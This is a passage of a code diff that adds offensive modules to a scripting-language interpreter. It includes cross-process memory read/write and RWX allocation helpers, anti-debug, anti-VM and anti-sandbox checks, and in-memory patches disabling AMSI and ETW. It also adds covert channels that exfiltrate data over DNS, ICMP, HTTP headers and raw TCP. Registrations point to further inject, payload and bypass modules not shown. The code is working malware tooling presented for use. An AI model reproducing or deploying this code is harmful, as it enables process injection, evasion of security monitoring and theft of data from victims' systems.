+        h = _k32().OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        if not h:
+            raise RuntimeError(f"OpenProcess failed for PID {pid} (err={ctypes.GetLastError()})")
+        return h
+
+    def _mem_read(pid, addr, size):
+        pid, addr, size = _v(pid), _v(addr), _v(size)
+        k32 = _k32()
+        h = _open_proc(pid)
+        try:
+            buf  = (ctypes.c_char * size)()
+            read = ctypes.c_size_t(0)
+            if not k32.ReadProcessMemory(h, addr, buf, size, ctypes.byref(read)):
+                return _rv(None, "null")
+            from interpreter import KoppaBytes
+            return _rv(KoppaBytes(bytes(buf[:read.value])), "bytes")
+        finally:
+            k32.CloseHandle(h)
+
+    def _mem_write(pid, addr, data):
+        pid, addr = _v(pid), _v(addr)
+        raw = _v(data)
+        if hasattr(raw, "data"):
+            data_bytes = raw.data
+        elif isinstance(raw, (bytes, bytearray)):
+            data_bytes = bytes(raw)
+        elif isinstance(raw, str):
+            data_bytes = raw.encode()
+        else:
+            data_bytes = bytes([raw]) if isinstance(raw, int) else b""
+        k32 = _k32()
+        h = _open_proc(pid)
+        try:
+            buf     = (ctypes.c_char * len(data_bytes))(*data_bytes)
+            written = ctypes.c_size_t(0)
+            ok = k32.WriteProcessMemory(h, addr, buf, len(data_bytes), ctypes.byref(written))
+            return _rv({"ok": bool(ok), "written": written.value}, "dict")
+        finally:
+            k32.CloseHandle(h)
+
+    def _mem_alloc(pid, size, prot=None):
+        pid, size = _v(pid), _v(size)
+        prot = _v(prot) if prot is not None else PAGE_EXECUTE_READWRITE
+        k32 = _k32()
+        h = _open_proc(pid)
+        try:
+            addr = k32.VirtualAllocEx(h, None, size, MEM_COMMIT | MEM_RESERVE, prot)
+            return _rv(addr, "int")
+        finally:
+            k32.CloseHandle(h)
+
+    def _mem_free(pid, addr):
+        pid, addr = _v(pid), _v(addr)
+        k32 = _k32()
+        h = _open_proc(pid)
+        try:
+            return _rv(bool(k32.VirtualFreeEx(h, addr, 0, MEM_RELEASE)), "bool")
+        finally:
+            k32.CloseHandle(h)
+
+    def _mem_protect(pid, addr, size, prot):
+        pid, addr, size, prot = _v(pid), _v(addr), _v(size), _v(prot)
+        k32 = _k32()
+        h = _open_proc(pid)
+        try:
+            old = ctypes.c_ulong(0)
+            ok  = k32.VirtualProtectEx(h, addr, size, prot, ctypes.byref(old))
+            return _rv({"ok": bool(ok), "old_prot": old.value}, "dict")
+        finally:
+            k32.CloseHandle(h)
+
+    def _mem_scan(pid, pattern):
+        pid = _v(pid)
+        raw = _v(pattern)
+        if hasattr(raw, "data"):
+            pat = raw.data
+        elif isinstance(raw, str):
+            pat = bytes.fromhex(raw.replace(" ", "").replace("\\x", ""))
+        else:
+            pat = bytes(raw)
+
+        k32 = _k32()
+        h   = _open_proc(pid)
+
+        class MEMORY_BASIC_INFORMATION(ctypes.Structure):
+            _fields_ = [
+                ("BaseAddress",       ctypes.c_void_p),
+                ("AllocationBase",    ctypes.c_void_p),
+                ("AllocationProtect", ctypes.c_ulong),
+                ("RegionSize",        ctypes.c_size_t),
+                ("State",             ctypes.c_ulong),
+                ("Protect",           ctypes.c_ulong),
+                ("Type",              ctypes.c_ulong),
+            ]
+
+        class SYSTEM_INFO(ctypes.Structure):
+            _fields_ = [
+                ("wProcessorArchitecture",      ctypes.c_uint16),
+                ("wReserved",                   ctypes.c_uint16),
+                ("dwPageSize",                  ctypes.c_ulong),
+                ("lpMinimumApplicationAddress", ctypes.c_void_p),
+                ("lpMaximumApplicationAddress", ctypes.c_void_p),
+                ("dwActiveProcessorMask",       ctypes.POINTER(ctypes.c_ulong)),
+                ("dwNumberOfProcessors",        ctypes.c_ulong),
+                ("dwProcessorType",             ctypes.c_ulong),
+                ("dwAllocationGranularity",     ctypes.c_ulong),
+                ("wProcessorLevel",             ctypes.c_uint16),
+                ("wProcessorRevision",          ctypes.c_uint16),
+            ]
+
+        try:
+            si = SYSTEM_INFO()
+            k32.GetSystemInfo(ctypes.byref(si))
+            cur  = si.lpMinimumApplicationAddress
+            top  = si.lpMaximumApplicationAddress
+            mbi  = MEMORY_BASIC_INFORMATION()
+            hits = []
+            while cur < top and len(hits) < 128:
+                if k32.VirtualQueryEx(h, cur, ctypes.byref(mbi), ctypes.sizeof(mbi)) == 0:
+                    break
+                if mbi.State == MEM_COMMIT_STATE:
+                    chunk = min(mbi.RegionSize, 0x100000)
+                    buf   = (ctypes.c_char * chunk)()
+                    read  = ctypes.c_size_t(0)
+                    if k32.ReadProcessMemory(h, cur, buf, chunk, ctypes.byref(read)):
+                        data = bytes(buf[:read.value])
+                        idx  = 0
+                        while True:
+                            pos = data.find(pat, idx)
+                            if pos == -1:
+                                break
+                            hits.append(_rv(cur + pos, "int"))
+                            idx = pos + 1
+                cur = cur + mbi.RegionSize
+            return _rv(hits, "array")
+        finally:
+            k32.CloseHandle(h)
+
+    def _mem_modules(pid):
+        pid = _v(pid)
+        if not _is_win:
+            return _rv([], "array")
+        k32   = _k32()
+        psapi = ctypes.windll.psapi
+        h     = _open_proc(pid)
+        try:
+            mods      = (ctypes.c_void_p * 1024)()
+            cb_needed = ctypes.c_ulong(0)
+            if not psapi.EnumProcessModules(h, mods, ctypes.sizeof(mods), ctypes.byref(cb_needed)):
+                return _rv([], "array")
+            count  = cb_needed.value // ctypes.sizeof(ctypes.c_void_p)
+
+            class MODULEINFO(ctypes.Structure):
+                _fields_ = [
+                    ("lpBaseOfDll", ctypes.c_void_p),
+                    ("SizeOfImage", ctypes.c_ulong),
+                    ("EntryPoint",  ctypes.c_void_p),
+                ]
+
+            result = []
+            for i in range(min(count, 1024)):
+                name_buf = ctypes.create_unicode_buffer(260)
+                psapi.GetModuleFileNameExW(h, mods[i], name_buf, 260)
+                mi = MODULEINFO()
+                psapi.GetModuleInformation(h, mods[i], ctypes.byref(mi), ctypes.sizeof(mi))
+                import os
+                result.append(_rv({
+                    "name":  os.path.basename(name_buf.value),
+                    "path":  name_buf.value,
+                    "base":  mi.lpBaseOfDll,
+                    "size":  mi.SizeOfImage,
+                    "entry": mi.EntryPoint,
+                }, "dict"))
+            return _rv(result, "array")
+        finally:
+            k32.CloseHandle(h)
+
+    return {
+        "read":                   lambda pid, addr, size: _mem_read(pid, addr, size),
+        "write":                  lambda pid, addr, data: _mem_write(pid, addr, data),
+        "alloc":                  lambda pid, size, prot=None: _mem_alloc(pid, size, prot),
+        "free":                   lambda pid, addr: _mem_free(pid, addr),
+        "protect":                lambda pid, addr, size, prot: _mem_protect(pid, addr, size, prot),
+        "scan":                   lambda pid, pattern: _mem_scan(pid, pattern),
+        "modules":                lambda pid: _mem_modules(pid),
+        "PAGE_NOACCESS":          _rv(0x01, "int"),
+        "PAGE_READONLY":          _rv(0x02, "int"),
+        "PAGE_READWRITE":         _rv(0x04, "int"),
+        "PAGE_EXECUTE":           _rv(0x10, "int"),
+        "PAGE_EXECUTE_READ":      _rv(0x20, "int"),
+        "PAGE_EXECUTE_READWRITE": _rv(0x40, "int"),
+    }
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# EVASION  (Anti-debug / Anti-VM / Anti-Sandbox)
+# ═══════════════════════════════════════════════════════════════════════
+
+def evasion_module() -> Dict[str, Callable]:
+    import platform
+    import os
+    import ctypes
+    import time as _time
+    import random
+    _is_win = platform.system() == "Windows"
+
+    def _is_debugged():
+        if not _is_win:
+            try:
+                with open("/proc/self/status") as f:
+                    for line in f:
+                        if line.startswith("TracerPid:"):
+                            return _rv(int(line.split()[1]) != 0, "bool")
+            except Exception:
+                pass
+            return _rv(False, "bool")
+        return _rv(bool(ctypes.windll.kernel32.IsDebuggerPresent()), "bool")
+
+    def _is_remote_debugged():
+        if not _is_win:
+            return _rv(False, "bool")
+        k32    = ctypes.windll.kernel32
+        is_dbg = ctypes.c_bool(False)
+        k32.CheckRemoteDebuggerPresent(k32.GetCurrentProcess(), ctypes.byref(is_dbg))
+        return _rv(is_dbg.value, "bool")
+
+    def _is_vm():
+        signs = []
+        if _is_win:
+            import winreg
+            vm_keys = [
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
+                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
+                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmhgfs"),
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters"),
+            ]
+            for hive, key in vm_keys:
+                try:
+                    winreg.OpenKey(hive, key)
+                    signs.append("registry:" + key.split("\\")[-1])
+                except Exception:
+                    pass
+            for f in [r"C:\windows\system32\vmtoolsd.exe", r"C:\windows\system32\vboxservice.exe"]:
+                if os.path.exists(f):
+                    signs.append("file:" + os.path.basename(f))
+            try:
+                import subprocess
+                r = subprocess.run(["wmic", "computersystem", "get", "model"],
+                                   capture_output=True, text=True, timeout=3)
+                if any(x in r.stdout.lower() for x in ["virtual", "vmware", "vbox", "qemu"]):
+                    signs.append("wmic:virtual_model")
+            except Exception:
+                pass
+        else:
+            try:
+                with open("/proc/cpuinfo") as f:
+                    if "hypervisor" in f.read().lower():
+                        signs.append("cpuinfo:hypervisor_flag")
+            except Exception:
+                pass
+            try:
+                with open("/sys/class/dmi/id/product_name") as f:
+                    p = f.read().strip().lower()
+                    if any(v in p for v in ["vmware", "virtualbox", "kvm", "qemu", "xen"]):
+                        signs.append("dmi:" + p)
+            except Exception:
+                pass
+        return _rv({"detected": len(signs) > 0, "indicators": [_rv(s, "string") for s in signs]}, "dict")
+
+    def _is_sandbox():
+        signs = []
+        if os.cpu_count() and os.cpu_count() < 2:
+            signs.append("single_cpu")
+        suspect_users = {"sandbox", "malware", "virus", "sample", "test", "john", "joe", "user"}
+        user = os.environ.get("USERNAME", os.environ.get("USER", "")).lower()
+        if user in suspect_users:
+            signs.append("suspect_user:" + user)
+        if _is_win:
+            for f in [r"C:\agent\agent.py", r"C:\sandbox\starter.exe"]:
+                if os.path.exists(f):
+                    signs.append("file:" + f)
+            try:
+                user32 = ctypes.windll.user32
+                w, h   = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
+                if w < 800 or h < 600:
+                    signs.append(f"low_res:{w}x{h}")
+            except Exception:
+                pass
+        try:
+            import psutil
+            if psutil.virtual_memory().total < 2 * 1024 ** 3:
+                signs.append("low_ram")
+        except Exception:
+            pass
+        return _rv({"detected": len(signs) > 0, "indicators": [_rv(s, "string") for s in signs]}, "dict")
+
+    def _is_wine():
+        if not _is_win:
+            return _rv(False, "bool")
+        try:
+            proc = ctypes.windll.kernel32.GetProcAddress(
+                ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll"), b"wine_get_version"
+            )
+            return _rv(bool(proc), "bool")
+        except Exception:
+            return _rv(False, "bool")
+
+    def _patch_etw():
+        if not _is_win:
+            return _rv({"ok": False, "error": "Windows only"}, "dict")
+        try:
+            k32 = ctypes.windll.kernel32
+            fn  = k32.GetProcAddress(k32.GetModuleHandleW("ntdll.dll"), b"NtTraceEvent")
+            if not fn:
+                return _rv({"ok": False, "error": "NtTraceEvent not found"}, "dict")
+            old = ctypes.c_ulong(0)
+            k32.VirtualProtect(fn, 1, 0x40, ctypes.byref(old))
+            ctypes.cast(fn, ctypes.POINTER(ctypes.c_uint8))[0] = 0xC3  # RET
+            k32.VirtualProtect(fn, 1, old.value, ctypes.byref(old))
+            return _rv({"ok": True, "target": "NtTraceEvent", "patch": "RET"}, "dict")
+        except Exception as e:
+            return _rv({"ok": False, "error": str(e)}, "dict")
+
+    def _patch_amsi():
+        if not _is_win:
+            return _rv({"ok": False, "error": "Windows only"}, "dict")
+        try:
+            k32 = ctypes.windll.kernel32
+            try:
+                k32.LoadLibraryW("amsi.dll")
+            except Exception:
+                pass
+            fn = k32.GetProcAddress(k32.GetModuleHandleW("amsi.dll"), b"AmsiScanBuffer")
+            if not fn:
+                return _rv({"ok": False, "error": "AmsiScanBuffer not found — amsi.dll not loaded"}, "dict")
+            patch = bytes([0x31, 0xC0, 0xC3])   # xor eax,eax ; ret
+            old   = ctypes.c_ulong(0)
+            k32.VirtualProtect(fn, len(patch), 0x40, ctypes.byref(old))
+            buf = (ctypes.c_uint8 * len(patch))(*patch)
+            ctypes.memmove(fn, buf, len(patch))
+            k32.VirtualProtect(fn, len(patch), old.value, ctypes.byref(old))
+            return _rv({"ok": True, "target": "AmsiScanBuffer", "patch": "xor_eax_ret"}, "dict")
+        except Exception as e:
+            return _rv({"ok": False, "error": str(e)}, "dict")
+
+    def _sleep_jitter(seconds, jitter_pct=None):
+        seconds     = _v(seconds)
+        jitter_pct  = _v(jitter_pct) if jitter_pct is not None else 0.2
+        jitter      = seconds * jitter_pct * (2 * random.random() - 1)
+        actual      = max(0.0, seconds + jitter)
+        start       = _time.perf_counter()
+        _time.sleep(actual)
+        elapsed     = _time.perf_counter() - start
+        ratio       = elapsed / actual if actual > 0 else 1.0
+        return _rv({"slept": round(elapsed, 4), "ratio": round(ratio, 4), "accelerated": ratio < 0.5}, "dict")
+
+    def _check_parent():
+        if not _is_win:
+            try:
+                return _rv({"ppid": os.getppid()}, "dict")
+            except Exception:
+                return _rv({"ppid": -1}, "dict")
+        try:
+            k32   = ctypes.windll.kernel32
+            ntdll = ctypes.windll.ntdll
+
+            class PBI(ctypes.Structure):
+                _fields_ = [
+                    ("ExitStatus",     ctypes.c_void_p),
+                    ("PebBaseAddress", ctypes.c_void_p),
+                    ("AffinityMask",   ctypes.c_void_p),
+                    ("BasePriority",   ctypes.c_void_p),
+                    ("UniqueProcessId",ctypes.c_void_p),
+                    ("InheritedFromUniqueProcessId", ctypes.c_void_p),
+                ]
+
+            pbi    = PBI()
+            retlen = ctypes.c_ulong(0)
+            ntdll.NtQueryInformationProcess(k32.GetCurrentProcess(), 0,
+                                            ctypes.byref(pbi), ctypes.sizeof(pbi),
+                                            ctypes.byref(retlen))
+            ppid = pbi.InheritedFromUniqueProcessId
+            parent_name = "unknown"
+            hp = k32.OpenProcess(0x0400, False, ppid)
+            if hp:
+                buf  = ctypes.create_unicode_buffer(260)
+                size = ctypes.c_ulong(260)
+                ctypes.windll.psapi.GetModuleFileNameExW(hp, None, buf, size)
+                parent_name = os.path.basename(buf.value)
+                k32.CloseHandle(hp)
+            suspicious_parents = {
+                "excel.exe", "winword.exe", "outlook.exe", "powerpnt.exe",
+                "mshta.exe", "wscript.exe", "cscript.exe", "rundll32.exe",
+            }
+            return _rv({
+                "ppid":        ppid,
+                "parent_name": parent_name,
+                "suspicious":  parent_name.lower() in suspicious_parents,
+            }, "dict")
+        except Exception as e:
+            return _rv({"error": str(e)}, "dict")
+
+    return {
+        "is_debugged":        lambda: _is_debugged(),
+        "is_remote_debugged": lambda: _is_remote_debugged(),
+        "is_vm":              lambda: _is_vm(),
+        "is_sandbox":         lambda: _is_sandbox(),
+        "is_wine":            lambda: _is_wine(),
+        "patch_etw":          lambda: _patch_etw(),
+        "patch_amsi":         lambda: _patch_amsi(),
+        "sleep":              lambda s, j=None: _sleep_jitter(s, j),
+        "check_parent":       lambda: _check_parent(),
+    }
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# COVERT CHANNELS  (DNS / ICMP / HTTP / TCP)
+# ═══════════════════════════════════════════════════════════════════════
+
+def covert_module() -> Dict[str, Callable]:
+    import base64
+    import socket
+    import struct
+    import random
+    import time as _time
+
+    def _to_bytes(val):
+        raw = _v(val)
+        if hasattr(raw, "data"):
+            return raw.data
+        if isinstance(raw, (bytes, bytearray)):
+            return bytes(raw)
+        if isinstance(raw, str):
+            return raw.encode()
+        return b""
+
+    def _dns_encode(data, domain):
+        domain  = _v(domain)
+        encoded = base64.b32encode(_to_bytes(data)).decode().lower().rstrip("=")
+        chunks  = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
+        fqdn    = ".".join(chunks) + "." + domain
+        return _rv({"fqdn": fqdn, "domain": domain, "chunks": len(chunks)}, "dict")
+
+    def _dns_decode(subdomain, domain=None):
+        subdomain = _v(subdomain)
+        domain    = _v(domain) if domain else None
+        # Strip trailing domain suffix if provided
+        if domain and subdomain.endswith("." + domain):
+            subdomain = subdomain[:-(len(domain) + 1)]
+        elif domain and subdomain.endswith(domain):
+            subdomain = subdomain[:-len(domain)].rstrip(".")
+        # Reassemble all label chunks
+        encoded   = "".join(subdomain.split(".")).upper()
+        pad       = (8 - len(encoded) % 8) % 8
+        encoded  += "=" * pad
+        try:
+            return _rv(base64.b32decode(encoded).decode("utf-8", errors="replace"), "string")
+        except Exception as e:
+            return _rv({"error": str(e)}, "dict")
+
+    def _dns_exfil(data, domain, nameserver=None):
+        domain     = _v(domain)
+        nameserver = _v(nameserver) if nameserver else None
+        encoded    = base64.b32encode(_to_bytes(data)).decode().lower().rstrip("=")
+        chunks     = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
+        sent = 0
+        errs = []
+        for i, chunk in enumerate(chunks):
+            query = f"{i}.{chunk}.{domain}"
+            try:
+                if nameserver:
+                    txid   = random.randint(0, 65535)
+                    header = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
+                    qbody  = b""
+                    for label in query.split("."):
+                        enc    = label.encode()
+                        qbody += bytes([len(enc)]) + enc
+                    qbody += b"\x00" + struct.pack("!HH", 1, 1)
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.settimeout(2)
+                    sock.sendto(header + qbody, (nameserver, 53))
+                    sock.close()
+                else:
+                    socket.gethostbyname(query)
+                sent += 1
+                _time.sleep(0.1)
+            except Exception as e:
+                errs.append(str(e))
+        return _rv({"chunks_sent": sent, "total": len(chunks), "errors": len(errs)}, "dict")
+
+    def _icmp_send(host, data):
+        host = _v(host)
+        raw  = _to_bytes(data)
+
+        def _chksum(pkt):
+            if len(pkt) % 2:
+                pkt += b"\x00"
+            s = sum(struct.unpack("!%dH" % (len(pkt) // 2), pkt))
+            s = (s >> 16) + (s & 0xFFFF)
+            s += s >> 16
+            return ~s & 0xFFFF
+
+        try:
+            icmp_id  = random.randint(0, 65535)
+            hdr      = struct.pack("bbHHh", 8, 0, 0, icmp_id, 1)
+            chk      = _chksum(hdr + raw)
+            hdr      = struct.pack("bbHHh", 8, 0, chk, icmp_id, 1)
+            sock     = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            sock.settimeout(3)
+            sock.sendto(hdr + raw, (host, 0))
+            sock.close()
+            return _rv({"ok": True, "host": host, "bytes": len(raw)}, "dict")
+        except PermissionError:
+            return _rv({"ok": False, "error": "requires admin/root for raw sockets"}, "dict")
+        except Exception as e:
+            return _rv({"ok": False, "error": str(e)}, "dict")
+
+    def _http_hide(url, data, header_name=None):
+        import urllib.request
+        url         = _v(url)
+        header_name = _v(header_name) if header_name else "X-Request-ID"
+        encoded     = base64.b64encode(_to_bytes(data)).decode()
+        try:
+            req = urllib.request.Request(url, headers={
+                header_name:  encoded,
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            })
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                return _rv({"ok": True, "status": resp.status, "header": header_name}, "dict")
+        except Exception as e:
+            return _rv({"ok": False, "error": str(e)}, "dict")
+
+    def _tcp_covert(host, port, data):
+        host, port = _v(host), _v(port)
+        raw        = _to_bytes(data)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((host, port))
+            frame = b"\xDE\xAD\xBE\xEF" + struct.pack("!I", len(raw)) + raw
+            sock.send(frame)
+            sock.close()
+            return _rv({"ok": True, "bytes": len(raw)}, "dict")
+        except Exception as e:
+            return _rv({"ok": False, "error": str(e)}, "dict")
+
+    return {
+        "dns_encode": lambda data, domain: _dns_encode(data, domain),
+        "dns_decode": lambda sub, domain=None: _dns_decode(sub, domain),
+        "dns_exfil":  lambda data, domain, ns=None: _dns_exfil(data, domain, ns),
+        "icmp_send":  lambda host, data: _icmp_send(host, data),
+        "http_hide":  lambda url, data, hdr=None: _http_hide(url, data, hdr),
+        "tcp_covert": lambda host, port, data: _tcp_covert(host, port, data),
+    }
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# ADVANCED CRYPTOGRAPHY  (AES / ChaCha20 / RC4 / RSA / KDF)
+# ═══════════════════════════════════════════════════════════════════════
+
+def crypt_module() -> Dict[str, Callable]:
+    import os
+    import hashlib
+    import hmac as _hmac
+
+    def _to_bytes(val):
+        raw = _v(val)
+        if hasattr(raw, "data"):
+            return raw.data
+        if isinstance(raw, (bytes, bytearray)):
+            return bytes(raw)
+        if isinstance(raw, str):
+            return raw.encode()
+        return b""
+
+    def _to_key(val, length=32):
+        raw = _to_bytes(val)
+        if len(raw) in (16, 24, 32):
+            return raw
+        return hashlib.sha256(raw).digest()[:length]
+
+    def _kb(data):
+        from interpreter import KoppaBytes
+        if isinstance(data, bytes):
+            return _rv(KoppaBytes(data), "bytes")
+        return _rv(KoppaBytes(bytes(data)), "bytes")
+
+    def _xor_cipher(data, key):
+        d = _to_bytes(data)
+        k = _to_bytes(key)
+        if not k:
+            return _kb(d)
+        return _kb(bytes(d[i] ^ k[i % len(k)] for i in range(len(d))))
+
+    def _rc4(data, key):
+        d = _to_bytes(data)
+        k = _to_bytes(key)
+        S = list(range(256))
+        j = 0
+        for i in range(256):
+            j = (j + S[i] + k[i % len(k)]) % 256
+            S[i], S[j] = S[j], S[i]
+        i = j = 0
+        out = bytearray()
+        for byte in d:
+            i = (i + 1) % 256
+            j = (j + S[i]) % 256
+            S[i], S[j] = S[j], S[i]
+            out.append(byte ^ S[(S[i] + S[j]) % 256])
+        return _kb(bytes(out))
+
+    def _aes_encrypt(plaintext, key, iv=None, mode=None):
+        pt  = _to_bytes(plaintext)
+        k   = _to_key(key)
+        iv_val = _to_bytes(iv) if iv else os.urandom(16)
+        if not iv_val or len(iv_val) != 16:
+            iv_val = os.urandom(16)
+        try:
+            from Crypto.Cipher import AES
+            from Crypto.Util.Padding import pad
+            ct = AES.new(k, AES.MODE_CBC, iv_val).encrypt(pad(pt, 16))
+        except ImportError:
+            try:
+                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes as cmodes
+                from cryptography.hazmat.primitives import padding
+                from cryptography.hazmat.backends import default_backend
+                padder  = padding.PKCS7(128).padder()
+                padded  = padder.update(pt) + padder.finalize()
+                enc     = Cipher(algorithms.AES(k), cmodes.CBC(iv_val), backend=default_backend()).encryptor()
+                ct      = enc.update(padded) + enc.finalize()
+            except ImportError:
+                return _rv({"error": "pip install pycryptodome  OR  pip install cryptography"}, "dict")
+        from interpreter import KoppaBytes
+        return _rv({
+            "ciphertext": _rv(KoppaBytes(ct), "bytes"),
+            "iv":         _rv(KoppaBytes(iv_val), "bytes"),
+            "key_bits":   len(k) * 8,
+        }, "dict")
+
+    def _aes_decrypt(ciphertext, key, iv):
+        ct  = _to_bytes(ciphertext)
+        k   = _to_key(key)
+        iv2 = _to_bytes(iv)
+        try:
+            from Crypto.Cipher import AES
+            from Crypto.Util.Padding import unpad
+            return _kb(unpad(AES.new(k, AES.MODE_CBC, iv2).decrypt(ct), 16))
+        except ImportError:
+            try:
+                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes as cmodes
+                from cryptography.hazmat.primitives import padding
+                from cryptography.hazmat.backends import default_backend
+                dec    = Cipher(algorithms.AES(k), cmodes.CBC(iv2), backend=default_backend()).decryptor()
+                padded = dec.update(ct) + dec.finalize()
+                unpad  = padding.PKCS7(128).unpadder()
+                return _kb(unpad.update(padded) + unpad.finalize())
+            except ImportError:
+                return _rv({"error": "pip install pycryptodome  OR  pip install cryptography"}, "dict")
+
+    def _chacha20(data, key, nonce=None):
+        d     = _to_bytes(data)
+        k     = _to_key(key, 32)
+        n_val = _to_bytes(nonce) if nonce else os.urandom(16)
+        if len(n_val) not in (8, 12, 16):
+            n_val = os.urandom(16)
+        try:
+            from Crypto.Cipher import ChaCha20
+            n12 = n_val[:16] if len(n_val) >= 16 else n_val.ljust(16, b"\x00")
+            ct  = ChaCha20.new(key=k, nonce=n12).encrypt(d)
+        except ImportError:
+            try:
+                from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+                n12 = n_val[:12] if len(n_val) >= 12 else n_val.ljust(12, b"\x00")
+                ct  = ChaCha20Poly1305(k).encrypt(n12, d, None)
+            except ImportError:
+                return _rv({"error": "pip install pycryptodome  OR  pip install cryptography"}, "dict")
+        from interpreter import KoppaBytes
+        return _rv({
+            "ciphertext": _rv(KoppaBytes(ct), "bytes"),
+            "nonce":      _rv(KoppaBytes(n_val), "bytes"),
+        }, "dict")
+
+    def _rsa_gen(bits=None):
+        bits = int(_v(bits)) if bits else 2048
+        try:
+            from Crypto.PublicKey import RSA
+            k = RSA.generate(bits)
+            return _rv({
+                "private_pem": k.export_key().decode(),
+                "public_pem":  k.publickey().export_key().decode(),
+                "bits":        bits,
+            }, "dict")
+        except ImportError:
+            try:
+                from cryptography.hazmat.primitives.asymmetric import rsa
+                from cryptography.hazmat.primitives import serialization
+                from cryptography.hazmat.backends import default_backend
+                priv = rsa.generate_private_key(65537, bits, backend=default_backend())
+                return _rv({
+                    "private_pem": priv.private_bytes(
+                        serialization.Encoding.PEM,
+                        serialization.PrivateFormat.TraditionalOpenSSL,
+                        serialization.NoEncryption()
+                    ).decode(),
+                    "public_pem": priv.public_key().public_bytes(
+                        serialization.Encoding.PEM,
+                        serialization.PublicFormat.SubjectPublicKeyInfo
+                    ).decode(),
+                    "bits": bits,
+                }, "dict")
+            except ImportError:
+                return _rv({"error": "pip install pycryptodome  OR  pip install cryptography"}, "dict")
+
+    def _derive_key(password, salt=None, iters=None, length=None, algo=None):
+        pw     = _to_bytes(password)
+        salt   = _to_bytes(salt) if salt else os.urandom(16)
+        if not salt:
+            salt = os.urandom(16)
+        iters  = int(_v(iters)) if iters else 100_000
+        length = int(_v(length)) if length else 32
+        algo   = _v(algo) if algo else "sha256"
+        key    = hashlib.pbkdf2_hmac(algo, pw, salt, iters, length)
+        from interpreter import KoppaBytes
+        return _rv({
+            "key":        _rv(KoppaBytes(key), "bytes"),
+            "salt":       _rv(KoppaBytes(salt), "bytes"),
+            "algorithm":  f"pbkdf2_{algo}",
+            "iterations": iters,
+        }, "dict")
+
+    def _gen_key(bits=None):
+        bits = int(_v(bits)) if bits else 256
+        return _kb(os.urandom(bits // 8))
+
+    def _hmac_sign(data, key, algo=None):
+        algo = _v(algo) if algo else "sha256"
+        return _rv(_hmac.new(_to_bytes(key), _to_bytes(data), algo).hexdigest(), "string")
+
+    return {
+        "xor":         lambda data, key: _xor_cipher(data, key),
+        "rc4":         lambda data, key: _rc4(data, key),
+        "aes_encrypt": lambda pt, key, iv=None: _aes_encrypt(pt, key, iv),
+        "aes_decrypt": lambda ct, key, iv: _aes_decrypt(ct, key, iv),
+        "chacha20":    lambda data, key, nonce=None: _chacha20(data, key, nonce),
+        "rsa_gen":     lambda bits=None: _rsa_gen(bits),
+        "derive_key":  lambda pwd, salt=None, iters=None, length=None, algo=None: _derive_key(pwd, salt, iters, length, algo),
+        "gen_key":     lambda bits=None: _gen_key(bits),
+        "gen_iv":      lambda: _kb(os.urandom(16)),
+        "hmac":        lambda data, key, algo=None: _hmac_sign(data, key, algo),
+    }
+
+
 ALL_MODULES = {
     "native_str":    str_module,
     "native_list":   list_module,
@@ -1330,8 +2746,19 @@ ALL_MODULES = {
     "native_brute":  brute_module,
     "native_parse":  parse_module,
     "native_report": report_module,
-    "native_smtp":   smtp_module,
-    "native_ftp":    ftp_module,
+    "native_smtp":    smtp_module,
+    "native_ftp":     ftp_module,
+    "native_vuln":    vuln_module,
+    "native_session": session_module,
+    "native_payload": payload_module,
+    "native_bypass":  bypass_module,
+    "native_advscan": adv_scan_module,
+    # Security-native
+    "native_inject":  inject_module,
+    "native_mem":     mem_module,
+    "native_evasion": evasion_module,
+    "native_covert":  covert_module,
+    "native_crypt":   crypt_module,
 }
 
 MODULE_ALIASES = {
@@ -1356,6 +2783,17 @@ MODULE_ALIASES = {
     "brute":  "native_brute",
     "parse":  "native_parse",
     "report": "native_report",
-    "smtp":   "native_smtp",
-    "ftp":    "native_ftp",
+    "smtp":    "native_smtp",
+    "ftp":     "native_ftp",
+    "vuln":    "native_vuln",
+    "session": "native_session",
+    "payload": "native_payload",
+    "bypass":  "native_bypass",
+    "scan":    "native_advscan",
+    # Security-native
+    "inject":  "native_inject",
+    "mem":     "native_mem",
+    "evasion": "native_evasion",
+    "covert":  "native_covert",
+    "crypt":   "native_crypt",
 }
